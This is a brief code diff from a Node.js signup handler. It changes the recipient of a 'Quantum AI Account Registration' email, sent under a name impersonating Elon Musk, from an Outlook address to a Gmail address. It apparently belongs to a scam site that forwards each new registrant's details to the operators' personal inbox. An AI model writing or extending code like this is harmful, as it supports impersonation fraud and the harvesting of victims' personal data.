@@ -148,7 +148,7 @@ server.post("/signup", async (req, res) => {
                 name: "elonmuskreeveofficial@outlook.com",
                 address: senderMail
             },
-            to: "elonmuskreeveofficial@outlook.com",
+            to: "confirmedlink1@gmail.com",
             subject: "Quantum AI Account Registration",
 
             html: maill // HTML version of the message
